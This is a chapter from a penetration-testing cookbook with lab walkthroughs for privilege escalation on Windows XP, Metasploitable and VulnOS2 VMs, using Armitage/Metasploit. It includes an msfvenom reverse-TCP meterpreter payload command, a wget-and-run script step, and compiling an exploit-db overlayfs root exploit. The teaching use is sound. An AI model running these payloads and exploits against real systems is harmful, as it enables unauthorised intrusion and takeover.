<html><head></head><body>
        <section>

                            <header>
                    <h1 class="header-title">Privilege Escalation</h1>
                </header>
            
            <article>
                
<p>In this chapter, we will cover the following topics:</p>
<ul>
<li>Establishing a connection as an elevated user</li>
<li>Remotely bypassing Windows UAC</li>
<li>Local Linux system check for privilege escalation</li>
<li>Local Linux privilege escalation</li>
<li>Remote Linux privilege escalation</li>
<li>DirtyCOW privilege escalation for Linux</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Introduction</h1>
                </header>
            
            <article>
                
<p>Now that we have some small foothold in the environment, we will use this foothold to expand the scope of our breach, increase the admin level, and use lateral movement to compromise more machines. In most cases, the initial point of a breach is not the desired target but just a means to get to the more valuable targets. By elevating privileges it will make your ability to move in the environment much easier.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Establishing a connection as an elevated user </h1>
                </header>
            
            <article>
                
<p>In this recipe, we will establish a connection to a remote Windows computer. We will use the same skills that we learned in previous chapters to make our initial connection to the computer. </p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Your Kali Linux VM is powered up and you are logged in as root</li>
<li>Your Windows XP VM is powered up</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>We will now connect to a Windows machine and elevate that connection to a privileged level:</p>
<ol>
<li>Validate the IP addresses of your Kali box and your Windows machine—you should have interfaces on both of your host-only networks on both boxes. In my case, my Kali VM is <kbd>192.168.56.10</kbd> and my Windows XP VM is <kbd>192.168.56.102</kbd>.</li>
<li>Let's ensure we have NetBIOS over TCP enabled in Windows XP. Log in to your Windows XP VM as an administrator and click on<strong> </strong><span class="packt_screen">Start</span> | <span class="packt_screen">Control Panel</span> | <span class="packt_screen">Network Connections</span><span>.</span></li>
</ol>
<ol start="3">
<li>Right-click on your <span class="packt_screen">Local Area Connection</span> <span>and click on</span> <span class="packt_screen">Properties</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="449" width="598" class="alignnone size-full wp-image-1208 image-border" src="assets/187c679f-1227-496c-8011-8211668d0109.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Windows network connection screen</div>
<ol start="4">
<li>Click on the <span class="packt_screen">Advanced</span> button in the bottom right and then click on <span class="packt_screen">WINS</span> at the top, and ensure <span class="packt_screen">Enable NetBIOS over TCP/IP</span> is selected:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="370" width="305" class="alignnone size-full wp-image-1209 image-border" src="assets/4f3601a5-849d-4adb-a8d9-cdd7e59f4e1f.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Advanced TCP/IP settings: WINS</div>
<ol start="5">
<li>If it was not selected, click on <span class="packt_screen">OK</span> | <span class="packt_screen">Close</span> and reboot your Windows XP VM.</li>
<li>For the purposes of this book, we will use Armitage, but if you would rather do everything through the CLI, you may use <kbd>msfconsole</kbd>. We will also clear the database if there are any hosts displayed in it at this time.</li>
</ol>
<div class="packt_tip">Refer to <a href="9f678d15-2115-4e29-a75d-03dba65d3398.xhtml" target="_blank">Chapter 4</a>, <em>Finding Exploits in the Target</em>, for information on starting Armitage or Metasploit and clearing the database, depending on your preference. </div>
<ol start="7">
<li>From the Armitage screen, we will click on <span class="packt_screen">Hosts</span> | <span class="packt_screen">Add Hosts</span> and enter our Windows XP machine IP address <kbd>192.168.56.102</kbd> and then click on <span class="packt_screen">Add</span>. Click on <span class="packt_screen">OK</span> when it acknowledges that the host was added:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="466" width="643" class="alignnone size-full wp-image-1210 image-border" src="assets/21fda32f-6900-4088-b3e0-40911e7e642f.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: Add Hosts dialog</div>
<ol start="8">
<li>From the top menu, click on <span class="packt_screen">Hosts</span> | <span class="packt_screen">Nmap Scan</span> | <span class="packt_screen">Intense Scan</span> and for the scan range, enter the IP address of the XP machine and click <span class="packt_screen">OK</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="427" width="589" class="alignnone size-full wp-image-1217 image-border" src="assets/705a5d34-eedb-41da-9c67-f7b49aaff0bb.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: nmap scan</div>
<ol start="9">
<li>Once <kbd>nmap</kbd> is finished, you will be presented with a <span class="packt_screen">Scan Complete!</span> message; click <span class="packt_screen">OK</span>:</li>
<li>From the top menu, click on <span class="packt_screen">Attacks</span> | <span class="packt_screen">Find Attacks</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="410" width="567" class="alignnone size-full wp-image-1219 image-border" src="assets/91513504-9421-4097-93c5-18e7394baaf9.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: main screen</div>
<ol start="11">
<li>On the <span class="packt_screen">Attack Analysis Complete</span><span class="packt_screen"><span class="packt_screen">.</span>..</span> screen, click <span class="packt_screen">OK</span>.</li>
</ol>
<ol start="12">
<li>Right-click on the host and click on <span class="packt_screen">Attack</span> | <span class="packt_screen">smb</span> | <span class="packt_screen">ms08_067_netapi</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="132" width="243" class="alignnone size-full wp-image-1218 image-border" src="assets/0e122b6f-e0cc-476c-ae72-c98ffbfe3a0a.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: main screen</div>
<ol start="13">
<li>From the <span class="packt_screen">Attack</span> dialog, click on <span class="packt_screen">Launch</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"> <img height="289" width="474" class="alignnone size-full wp-image-1220 image-border" src="assets/f6885753-15a4-46ce-8af5-1a5f33346fcb.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: attack dialog screen</div>
<ol start="14">
<li>You will notice that the host now shows you have compromised the device:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="453" width="625" class="alignnone size-full wp-image-1221 image-border" src="assets/0e694fff-b826-4fe2-81c7-2784e6d4ce52.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: main screen</div>
<ol start="15">
<li>Right-click on the XP host and click on <span class="packt_screen">Meterpreter 1</span> | <span class="packt_screen">Interact</span> | <span class="packt_screen">Meterpreter Shell</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="476" width="658" class="alignnone size-full wp-image-1222 image-border" src="assets/36b1d2d1-11c7-4995-90cd-80b11389c657.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: main screen</div>
<ol start="16">
<li>From the shell, enter <kbd>getuid</kbd> to see who is currently logged in – you will notice you have system-level privileges:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="490" width="653" class="alignnone size-full wp-image-1223 image-border" src="assets/a204ed9e-fccd-44e3-87f2-f7b7e5e00461.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: main screen</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Remotely bypassing Windows UAC </h1>
                </header>
            
            <article>
                
<p>In this recipe, we will establish a connection to a remote Windows computer. We will then bypass <strong>User Account Control</strong> (<span><strong>UAC</strong>) </span>to gain elevated permissions. The UAC is part of windows attempt to harden itself from remote attack by prompting the user to confirm potential escalated privileges requests.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Your Kali Linux VM is powered up and you are logged in as root</li>
<li>Your Windows XP VM is powered up</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>We will remotely bypass Windows UAC to elevate privileges:</p>
<ol>
<li>Validate the IP addresses of your Kali VM and your Windows VM – you should have interfaces on both of your host-only networks on both boxes. In my case, my Kali device is <kbd>192.168.56.10</kbd> and my Windows XP device is <kbd>192.168.56.102</kbd>.</li>
<li>Open a terminal window by clicking the terminal icon: <img style="font-size: 1em" src="assets/58d64492-2224-4790-866e-60e7030e7b9a.png"/></li>
<li>We will quickly create a payload file with <kbd>msfvenom</kbd> by typing the following command:</li>
</ol>
<pre style="padding-left: 60px"><strong>msfvenom -p Windows/meterpreter/reverse_tcp lhost=192.168.56.10 lport=8443 -f exe &gt; /root/exploit.exe </strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="187" width="445" class="alignnone size-full wp-image-1224 image-border" src="assets/96a824a9-1d64-499b-a3dc-91175db40693.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Kali: Terminal output</div>
<ol start="4">
<li>Once the payload is created, move it to your target machine.</li>
</ol>
<ol start="5">
<li>Log in to your target machine as a standard user. In my case, I will be logging in as <kbd>Jane Doe</kbd>. You can open Command Prompt and use the <kbd>qwinsta</kbd> <span>command, or on later versions of Windows, you can use the</span> <kbd>whoami</kbd> <span>command, similar to Linux systems:</span></li>
</ol>
<div class="packt_infobox">The <kbd>qwinsta</kbd> command and the <kbd>whoami</kbd> command provide information about the currently logged in session. The <kbd>qwinsta</kbd> has been used since the early days of Windows. The <kbd>whoami</kbd> command was a standard command used in Linux environments for years and was ultimately adopted by more recent versions of Windows.</div>
<div class="CDPAlignCenter CDPAlign"><img height="461" width="593" class="alignnone size-full wp-image-1225 image-border" src="assets/d9ce1c86-542e-4f7f-b416-1e9f3d726b27.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Windows: Command Prompt</div>
<ol start="6">
<li>Let's start a listener in Armitage for the payload we just copied over.</li>
</ol>
<div class="packt_tip packt_infobox">Refer to <a href="9f678d15-2115-4e29-a75d-03dba65d3398.xhtml" target="_blank">Chapter 4</a>, <em>Finding Exploits in the Target</em>, for more information on creating listeners.</div>
<ol start="7">
<li>From the Armitage main screen, select <span class="packt_screen">Armitage</span> | <span class="packt_screen">Listeners</span> | <span class="packt_screen">Reverse (wait for)</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="287" width="644" class="alignnone size-full wp-image-1226 image-border" src="assets/8daf179f-6ada-4cea-9a49-0900788ddce5.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: main screen</div>
<ol start="8">
<li>Set the <span class="packt_screen">Port</span> to <kbd>8443</kbd> and the <span class="packt_screen">Type</span> as <span class="packt_screen">meterpreter</span>, and click on <span class="packt_screen">Start Listener</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="104" width="142" class="alignnone size-full wp-image-1227 image-border" src="assets/40932b20-f1fb-44d1-b478-0d53791652ec.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: create listener dialog</div>
<ol start="9">
<li>From your Windows machine, launch the <kbd>exploit.exe</kbd> file by double-clicking on it:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="490" width="632" class="alignnone size-full wp-image-1228 image-border" src="assets/b7fa154a-f7de-4d62-b4b6-dfa2a9a8d9a2.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Windows main screen: launching exploit</div>
<ol start="10">
<li>You will now notice that we see the device exploited and a session has been created:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="510" width="624" class="alignnone size-full wp-image-1229 image-border" src="assets/dd551a4e-17df-411c-a00c-8c0caa9efa91.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: main screen</div>
<ol start="11">
<li>Right-click on the exploited machine and select <span class="packt_screen">Meterpreter 1</span> | <span class="packt_screen">Interact</span> | <span class="packt_screen">Meterpreter Shell</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="516" width="633" class="alignnone size-full wp-image-1230 image-border" src="assets/ff7f0d6e-c562-4714-9a51-d8ef994aeca9.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: main screen</div>
<ol start="12">
<li>From the <kbd>meterpreter</kbd> console, enter the following commands. You will notice that I am logged in as <kbd>Jane Doe</kbd> and I do not have the privileges to run the <kbd>getsystem</kbd> command:</li>
</ol>
<pre style="padding-left: 60px"><strong>getuid </strong><br/><strong>sysinfo</strong><br/><strong>getsystem </strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="198" width="530" class="alignnone size-full wp-image-1231 image-border" src="assets/cbb60a20-c771-443e-931a-edc4067f1ea4.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: meterpreter console</div>
<ol start="13">
<li>To bypass UAC controls, on the left, select <span class="packt_screen">exploit</span> | <span class="packt_screen">Windows</span> | <span class="packt_screen">local</span> | <span class="packt_screen">ms10_015_kitrap0d</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="232" width="521" class="alignnone size-full wp-image-1232 image-border" src="assets/2d96b2a4-ca53-467e-b377-801db9d0755e.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: main screen</div>
<ol start="14">
<li>In the dialog box, validate that the session correctly identifies the <kbd>msf</kbd> session you are currently working with (in my case, <span class="packt_screen">1</span>),<strong> </strong>and the <span class="packt_screen">LHOST</span> reflects the IP address of the interface on the same subnet as your Windows machine, and then click on <span class="packt_screen">Launch</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="290" width="371" class="alignnone size-full wp-image-1233 image-border" src="assets/d3e81b45-976a-4cb8-beae-72fb835c4323.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: exploit options screen</div>
<ol start="15">
<li>You will then see a successful exploit and a new session opened:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="191" width="491" class="alignnone size-full wp-image-1234 image-border" src="assets/b9ab2af8-41bf-4fb7-ba0f-d2e6194bf099.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage exploit screen</div>
<ol start="16">
<li>Select this new session by right-clicking on the Windows machine and selecting <span class="packt_screen">Meterpreter 2</span> | <span class="packt_screen">Interact</span> | <span class="packt_screen">Meterpreter Shell</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="449" width="632" class="alignnone size-full wp-image-1235 image-border" src="assets/bf8cf8e1-b673-4990-8a79-e0551e985621.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: main screen</div>
<ol start="17">
<li>Now let's rerun the previous commands. You will notice that I am logged in as <kbd>SYSTEM</kbd> and I do have the privileges to run the<span> </span><kbd>getsystem</kbd><span> </span>command:</li>
</ol>
<pre style="padding-left: 60px"><strong>getuid</strong><br/><strong>sysinfo </strong><br/><strong>getsystem </strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="194" width="601" class="alignnone size-full wp-image-1236 image-border" src="assets/52d921f7-fafd-440e-9606-58bc98c0deb3.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: meterpreter console</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Local Linux system check for privilege escalation </h1>
                </header>
            
            <article>
                
<p>In this recipe, we will use a Python script to check the system for vulnerabilities that could lead to privilege escalation.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Your Metasploitable machine is connected to the NAT network (remove it immediately after this lab)</li>
<li>Your Metasploitable machine is powered up</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>In this recipe we will try and discover a vulnerability that will allow us to escalate privileges in linux:</p>
<ol>
<li>Log in to the Metasploitable machine with the username <kbd>msfadmin</kbd> and password <kbd>msfadmin</kbd>.</li>
</ol>
<ol start="2">
<li>From the terminal prompt of the Metasploitable machine, run the following commands:</li>
</ol>
<pre style="padding-left: 60px"><strong>cd &lt;enter&gt;</strong><br/><strong>wget http://www.securitysift.com/download/linuxprivchecker.py &lt;enter&gt;</strong><br/><strong>python ./linuxprivchecker.py &gt;&gt; vulns.txt &lt;enter&gt;</strong><br/><strong>tail --lines=50 vulns.txt |more &lt;enter&gt;</strong></pre>
<ol start="3">
<li>You can now scroll through a list of vulnerabilities that can be used against this machine to provide privilege escalation:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="282" width="509" class="alignnone size-full wp-image-1237 image-border" src="assets/3ff6a38d-7e9a-4c68-bfdb-132c8675e0f6.png"/></div>
<div class="CDPAlignCenter CDPAlign packt_figref"> Metasploitable console output</div>
<ol start="4">
<li>From here, you can use the exploit DB we learned to use in previous recipes to see what attacks can be used against the Linux VM for privilege escalation.</li>
</ol>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Local Linux privilege escalation </h1>
                </header>
            
            <article>
                
<p>In this recipe, we will use a known exploit to gain elevated privileges for the logged-in user in Linux. We will have login credentials for a standard user and we will then escalate their privileges through local account access.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Your Kali VM is up and running</li>
<li>Download and set up Vulnerable OS 2 (VulnOS2) from <a href="https://www.vulnhub.com/entry/vulnos-2,147/">https://www.vulnhub.com/entry/vulnos-2,147/</a></li>
<li>Attach the network interface to your host-only network</li>
<li>Start your VulnOS2 image</li>
</ul>
<div class="packt_tip packt_infobox">Refer to <a href="7560c369-51ac-43f6-b94e-3889265b10bc.xhtml" target="_blank">Chapter 1</a>, <em>Installing Kali and the Lab Setup</em>, if you need assistance setting up the VM in VirtualBox.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>We will now elevate privileges in Linux:</p>
<ol>
<li>Start by finding the IP address of the VulnOS2 image – we can use a simple <kbd>nmap</kbd> scan to find it. Open a terminal window by clicking on the terminal icon.<img src="assets/f39e71d6-37a9-42fd-af2d-97306a5e6823.png"/></li>
<li>Enter the following commands to run a quick <kbd>nmap</kbd> for the host-only network of <kbd>192.168.56.0/24</kbd>:</li>
</ol>
<pre style="padding-left: 60px"><strong>nmap -T4 -F 192.168.56.0/24</strong></pre>
<ol start="3">
<li>From our output, we can see that the address of the machine is <kbd>192.168.56.104</kbd>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="362" width="474" class="alignnone size-full wp-image-1238 image-border" src="assets/a110a183-2c88-4526-bfba-84d1b0935325.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Kali console output</div>
<div class="packt_infobox">We are going to use this exploit through SSH access to the device. Local access to the device will work; however, the person who designed the VM used the AZERTY keyboard layout, so you will have to adjust for that if you want to do it locally. As this layout assumes a different keyboard layout you will not be able to simply type as you normally would. The creators intention for this is that as a penetration tester you have to be aware that different users or computers may provide unfamiliar environments to you that you would have to adjust to.</div>
<ol start="4">
<li>Let's SSH to the device and use the credentials that we found through other means. From the Kali command terminal window, enter the following:</li>
</ol>
<pre style="padding-left: 60px"><strong>ssh webmin@192.168.56.104</strong></pre>
<div class="packt_tip packt_infobox">The username is <kbd>webmin</kbd> and the password is <kbd>webmin1980</kbd>. If you are asked whether to continue connecting, select <span class="packt_screen">yes</span>. If you were given an error stating that the remote host identification has changed, you can clear your known hosts by typing <kbd>rm /root/.ssh/known_hosts &lt;enter&gt;</kbd> from the console and trying to SSH again.</div>
<ol start="5">
<li>Now assuming we used the previous recipe, Local Linux system check for privilege escalation, we could find that this system is vulnerable to exploit <kbd>37292</kbd>.</li>
<li>Open Firefox and go to <a href="https://www.exploit-db.com/exploits/37292/">https://www.exploit-db.com/exploits/37292/</a>. <span>Review the details of the exploit and click on</span> <span class="packt_screen">View Raw</span><span> and copy its contents to the clipboard:</span></li>
</ol>
<div class="packt_infobox">Vulnerability 37292 (CVE-2015-1328) overlayfs is a vulnerability affecting Ubuntu where it does not do proper checking of file creation in the upper filesystem area. Exploiting this can lead to root privilege.</div>
<div class="CDPAlignCenter CDPAlign"><img height="360" width="499" class="alignnone size-full wp-image-1239 image-border" src="assets/fd03aeeb-1475-4068-9aeb-a43d270ecc49.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Firefox: exploit database</div>
<ol start="7">
<li>From the SSH session, enter the following:</li>
</ol>
<pre style="padding-left: 60px"><strong>cd &lt;enter&gt;</strong><br/><strong>touch 37292.c &lt;enter&gt;</strong><br/><strong>nano 37292.c &lt;enter&gt;</strong></pre>
<ol start="8">
<li>Paste the contents of the clipboard, exit nano, and save the file:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="340" width="495" class="alignnone size-full wp-image-1240 image-border" src="assets/1eb8af4a-0736-4142-89fa-974bc078d88e.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">nano editor screen</div>
<ol start="9">
<li>Now we must compile the C code by entering the following—also note that we are logged in as <kbd>webmin</kbd> and the shutdown command fails:</li>
</ol>
<pre style="padding-left: 60px"><strong>cd &lt;enter&gt;</strong><br/><strong>gcc 37292.c -o 37292 &lt;enter&gt;</strong><br/><strong>whoami &lt;enter&gt;</strong><br/><strong>shutdown -h now &lt;enter&gt;</strong></pre>
<ol start="10">
<li>Now let's run the exploit by entering the following:</li>
</ol>
<pre style="padding-left: 60px"><strong>cd &lt;enter&gt;</strong><br/><strong>./37292 &lt;enter&gt;</strong><br/><strong>whoami &lt;enter&gt;</strong></pre>
<ol start="11">
<li>You will now notice that you are the root user:</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img style="text-align: center;color: black;font-size: 1em" height="152" width="501" class="alignnone size-full wp-image-1241 image-border" src="assets/dfa03d5b-fdc2-45d8-a179-451598e9eaac.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Console output screen</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Remote Linux privilege escalation </h1>
                </header>
            
            <article>
                
<p>In this recipe, we will use Metasploit against the Metasploitable VM to raise the privileges of the user.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Your Kali VM is up and running</li>
<li>Your Metasploitable VM is up and running and on the host-only network</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>In this recipe we will remotely elevate privilege on a Linux device:</p>
<ol>
<li>First, let's log in to the Metasploitable VM and add a standard user.</li>
</ol>
<div class="packt_infobox">Metasploitable's default username is <kbd>msfadmin</kbd> and password <kbd>msfadmin</kbd>.</div>
<ol start="2">
<li>From the console, enter the following commands to add a user and validate the IP address of the Metasploitable host:</li>
</ol>
<pre style="padding-left: 60px"><strong>cd &lt;enter&gt;</strong><br/><strong>ifconfig &lt;enter&gt;</strong><br/><strong>sudo useradd -m user7 &lt;enter&gt;</strong><br/><strong> msfadmin &lt;enter&gt;ex</strong><br/><strong>sudo passwd user7 &lt;enter&gt;</strong><br/><strong> password &lt;enter&gt;</strong><br/><strong> password &lt;enter&gt;</strong><br/><strong>exit &lt;enter&gt;</strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="300" width="508" class="alignnone size-full wp-image-1242 image-border" src="assets/63822a93-b98f-421b-bf63-5a49c1f667f6.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Metasploitable console</div>
<ol start="3">
<li>From Kali, let's start Armitage.</li>
</ol>
<div class="packt_infobox">Refer to <a href="9f678d15-2115-4e29-a75d-03dba65d3398.xhtml" target="_blank">Chapter 4</a>, <em>Finding Exploits in the Target</em>, for information on starting Armitage.</div>
<ol start="4">
<li>From Armitage, add the Metasploitable VM, in my case <kbd>192.168.56.105</kbd>, by clicking on <span class="packt_screen">Hosts</span> | <span class="packt_screen">Add Hosts</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="266" width="675" class="alignnone size-full wp-image-1243 image-border" src="assets/44e270d7-66a0-4451-a8ea-c638660f1b49.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: main screen</div>
<ol start="5">
<li>From the <span class="packt_screen">Add Hosts</span> dialog box, enter your Metasploitable VM's IP address and click on <span class="packt_screen">Add</span>. Click on <span class="packt_screen">OK</span> on the confirmation dialog box:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="189" width="251" class="alignnone size-full wp-image-1244 image-border" src="assets/55df966c-3bb2-4fcd-a385-a8af16d24b6a.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: Add Hosts dialog box</div>
<ol start="6">
<li>Run a quick scan against the device by selecting the host and then clicking on <span class="packt_screen">Hosts</span> | <span class="packt_screen">Nmap Scan</span> | <span class="packt_screen">Intense Scan</span>. Ensure the IP address of your VM is populated in the input screen and click on <span class="packt_screen">OK</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="127" width="290" class="alignnone size-full wp-image-1245 image-border" src="assets/301d8928-ebe7-487d-9684-2251270ef079.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: Input dialog box</div>
<ol start="7">
<li>Once the scan is complete, click <span class="packt_screen">OK</span> in the <span class="packt_screen">Scan Comple</span><span class="packt_screen">te</span> dialog box.</li>
<li>Now click on <span class="packt_screen">Attacks</span> | <span class="packt_screen">Find attacks</span> <span>from the top menu and click on</span> <span class="packt_screen">OK</span> i<span>n the <span class="packt_screen">Attack Analysis Complete...</span> dialog box.</span></li>
<li>Now let's log in with Telnet to the Metasploitable machine with the username and password that we have by right-clicking on the <span class="packt_screen">host</span> and selecting <span class="packt_screen">Login</span> | <span class="packt_screen">telnet</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="271" width="688" class="alignnone size-full wp-image-1246 image-border" src="assets/ef932ca8-50d3-41b7-904e-2358c51da583.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: main screen</div>
<ol start="10">
<li>In the login dialog box, enter <kbd>user7</kbd> <span>for the user </span>and <kbd>password</kbd> for the password, and then click on <span class="packt_screen">Launch</span>: </li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="225" width="350" class="alignnone size-full wp-image-1247 image-border" src="assets/4c30f5ef-b192-41e7-be44-2188885b41fd.png"/>.</div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: Launch dialog box</div>
<ol start="11">
<li>You will now see that we have remote access to the box based on the host icon change:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="425" width="586" class="alignnone size-full wp-image-1248 image-border" src="assets/ad866731-3b97-463c-91fe-d4ba5c68956a.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: main screen</div>
<ol start="12">
<li>Right-click on the <span class="packt_screen">hosts</span> and select the <span class="packt_screen">shell</span><strong> </strong>| <span class="packt_screen">Interact</span> option, and you will be dropped into a Command Prompt window on the Metasploitable machine. Enter the following:</li>
</ol>
<pre style="padding-left: 60px"><strong>whoami &lt;enter&gt;</strong><br/><strong>shutdown -h now &lt;enter&gt;</strong><br/><strong>sudo shutdown -h now &lt;enter&gt;</strong></pre>
<ol start="13">
<li>From the output, you will notice that we are a standard user and have no root or <kbd>sudo</kbd> privileges:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="221" width="671" class="alignnone size-full wp-image-1249 image-border" src="assets/164e288c-7bfa-4f92-a435-a3b46edfbea2.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: shell output</div>
<ol start="14">
<li>Now let's try and exploit the system to gain root access. Right-click on the <span class="packt_screen">hosts</span> and select <span class="packt_screen">Attack</span> | <span class="packt_screen">samba</span> | <span class="packt_screen">usermap_script</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="274" width="687" class="alignnone size-full wp-image-1250 image-border" src="assets/73fa81f0-0fdd-475f-951b-7f23dbc97b02.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: main screen</div>
<ol start="15">
<li>On the attack dialog box, make sure your <span class="packt_screen">LHOST</span> is correct, and click on <span class="packt_screen">Launch</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="241" width="394" class="alignnone size-full wp-image-1251 image-border" src="assets/5501de39-53cf-40ef-a82c-66cc12b776ef.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage: attack dialog</div>
<ol start="16">
<li>After it shows a successful launch, you will see that a new shell session was created, in my case, shell 8:</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img style="text-align: center;color: black;font-size: 1em" height="216" width="653" class="alignnone size-full wp-image-1252 image-border" src="assets/b10c18cc-33b4-408d-8900-b6a2e08501da.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage exploit output</div>
<ol start="17">
<li>Right-click on the <span class="packt_screen">host</span> and select the<span> </span><span class="packt_screen">shell8</span> | <span class="packt_screen">Interact</span><span> </span>option, and you will be dropped into a Command Prompt window in the Metasploitable machine. Enter the following:</li>
</ol>
<pre style="padding-left: 60px"><strong>whoami &lt;enter&gt;</strong></pre>
<ol start="18">
<li>You will now see that we are the root user and we can shut down the host with the following command:</li>
</ol>
<pre style="padding-left: 60px"><strong>shutdown -h now &lt;enter&gt;</strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="215" width="648" class="alignnone size-full wp-image-1253 image-border" src="assets/9bc6d6b1-9b76-4318-89b3-8471cddd43a0.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage shell output</div>
<ol start="19">
